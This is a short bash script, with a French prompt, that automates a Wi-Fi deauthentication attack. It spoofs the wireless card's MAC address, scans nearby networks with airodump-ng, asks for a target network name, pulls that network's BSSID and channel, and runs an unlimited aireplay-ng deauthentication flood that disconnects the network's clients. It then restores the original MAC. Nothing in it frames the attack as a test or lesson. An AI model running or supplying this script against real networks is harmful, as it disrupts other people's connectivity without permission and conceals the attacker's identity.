#!/bin/bash
airmon-ng start wlan0
ifconfig wlan0mon down
macchanger -r wlan0mon
ifconfig wlan0mon up
fileName=$(date  --rfc-3339=seconds).csv
airodump-ng --update 2 wlan0mon |& tee $fileName
echo 'Donner le nom du reseau cible..'
read nameAP
macTarget=$(grep $nameAP $fileName | tr -s [:space:] | cut -d ' ' -f2 | uniq)
channelTarget=$(grep $nameAP $fileName | tr -s [:space:] | cut -d ' ' -f7 | uniq)
airmon-ng start wlan0mon $channelTarget
aireplay-ng -0 0  -a $macTarget wlan0mon
sleep 5
macchanger -p wlan0mon
airmon-ng stop wlan0mon

